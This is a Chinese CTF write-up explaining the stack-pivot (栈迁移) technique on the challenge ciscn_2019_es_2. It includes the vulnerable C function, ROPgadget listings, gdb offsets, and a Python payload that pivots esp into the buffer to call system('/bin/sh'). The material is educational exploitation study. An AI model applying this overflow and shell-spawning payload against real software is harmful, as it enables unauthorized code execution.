在做题的时候又遇到了不会的方式->栈迁移

# 栈迁移

## 条件：

可溢出的长度不够用，也就是没办法溢出到返回地址只能溢出覆盖ebp。（按照常规思路，先造成溢出再将rop链写入。但现在没有构造rop的空间）



栈迁移能被实施的条件有二：

1. 存在 `leave ret`这类gadget指令    
2. 存在可执行`shellcode`的内存区域

对于条件一，使用`ROPGadget`可查看存在哪些gadget

## 原理：

利用两次`leave;ret`，第一次把`ebp`放在我们想让他去的位置，第二次把esp也放在这个地址，在`pop ebp`之后`esp`也指向了下一个内存单元，然后将下一个内存单元设置成shell的内容即可



## 例题：

#### ciscn_2019_es_2

```c#
int vul()
{
  char s[40]; // [esp+0h] [ebp-28h] BYREF

  memset(s, 0, 0x20u);
  read(0, s, 0x30u);
  printf("Hello, %s\n", s);
  read(0, s, 0x30u);
  return printf("Hello, %s\n", s);
}
```

第一个read读了`0x30`字节，而s距离`ebp`只有`0x28`，所以可以栈溢出，但是只有`0x30-0x28=0x8`字节的溢出,没办法将`rop`链写入



我们这里利用栈上面的空间，将栈上前`0x28`字节放入`rop`，然后最后`0x8`字节实现栈迁移



而这个题给了system函数，满足上述条件2，我们`ROPgadget`一下

```c#
ROPgadget --binary zhan | grep 'leave'
0x0804862d : add byte ptr [eax], al ; mov ecx, dword ptr [ebp - 4] ; leave ; lea esp, [ecx - 4] ; ret
0x08048542 : add esp, 0x10 ; leave ; jmp 0x80484c0
0x080484b5 : add esp, 0x10 ; leave ; repz ret
0x0804855e : add esp, 0x10 ; nop ; leave ; ret
0x08048631 : cld ; leave ; lea esp, [ecx - 4] ; ret
0x08048630 : dec ebp ; cld ; leave ; lea esp, [ecx - 4] ; ret
0x08048545 : leave ; jmp 0x80484c0
0x08048632 : leave ; lea esp, [ecx - 4] ; ret
0x080484b8 : leave ; repz ret
0x08048562 : leave ; ret
0x08048543 : les edx, ptr [eax] ; leave ; jmp 0x80484c0
0x080484b6 : les edx, ptr [eax] ; leave ; repz ret
0x0804855f : les edx, ptr [eax] ; nop ; leave ; ret
0x08048514 : mov byte ptr [0x804a048], 1 ; leave ; repz ret
0x0804855a : mov byte ptr [0x83fffffe], al ; les edx, ptr [eax] ; nop ; leave ; ret
0x0804862f : mov ecx, dword ptr [ebp - 4] ; leave ; lea esp, [ecx - 4] ; ret
0x08048561 : nop ; leave ; ret
0x08048519 : or byte ptr [ecx], al ; leave ; repz ret
```



可以看到有很多可利用的`leave;ret`，满足条件1，所以可以实现栈迁移。首先可以利用vul函数里的printf带出ebp的地址，从而算出我们要劫持的地址`s`的精确地址



我们在vul的nop处下断，输入点东西定位一下具体偏移

```c
00:0000│ esp 0xffffd130 ◂— 'aaaa\n'
01:0004│     0xffffd134 ◂— 0xa /* '\n' */
02:0008│     0xffffd138 ◂— 0x0
... ↓        5 skipped
08:0020│     0xffffd150 —▸ 0x80486d8 ◂— push edi /* "Welcome, my friend. What's your name?" */
09:0024│     0xffffd154 —▸ 0xf7fbe66c —▸ 0xf7ffdba0 —▸ 0xf7fbe780 —▸ 0xf7ffda40 ◂— ...
0a:0028│ ebp 0xffffd158 —▸ 0xffffd168 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0x0
```



esp位于`0xffffd130`，ebp寄存器位于`0xffffd158`，而ebp所存内容位于`0xffffd168`(栈中的ebp)，所以我们用printf泄露ebp的地址，减去0x38，就是我们要劫持的esp的地址



我们要做的就是把ebp寄存器中的内容覆盖为`ebp内容地址-0x38`，而`ebp内容地址`已经被我们泄露，随后执行第二个ret的时候,esp也被覆盖为该值，实现了将esp劫持至`ebp内容地址-0x38`，然后执行shellcode



然后别忘了要把gdb测试的数据填入进去



以下是payload中栈迁移的部分

```python
payload2 = b'aaaa'#填入我们gdb测试时候的数据
payload2 += p32(system_plt)#esp从这里开始执行
payload2 += b'dddd' #这里为了栈的完整性，填一个假的ebp
payload2 += p32(ebp - 0x28) #写入binsh的地址
payload2 += b'/bin/sh\x00' #写入binsh
payload2 = payload2.ljust(0x28, b'p')#填充剩余的，直到ebp

payload2 += p32(ebp - 0x38) #覆盖ebp为ebp-0x38
payload2 += p32(leave_ret) #将ret覆盖为我们ROPgadget找到的地址
```

简而言之，栈迁移就是恰好就用能被轻易修改的ebp实现了对esp的篡改，进而影响到eip。



所以两次leave ret：

将栈上ret覆盖为我们找到的`leave ret`指令的地址，即最终程序退出时会执行两次`leave`指令，一次`ret`指令。由此，当`pop ebp`被第一次执行后，eip将指向又一条 `mov esp, ebp`指令的地址，而此时ebp寄存器的内容已变为了我们篡改过的栈上 `ebp`的数据。这样，`esp`就到了另外的一处内存空间实现栈迁移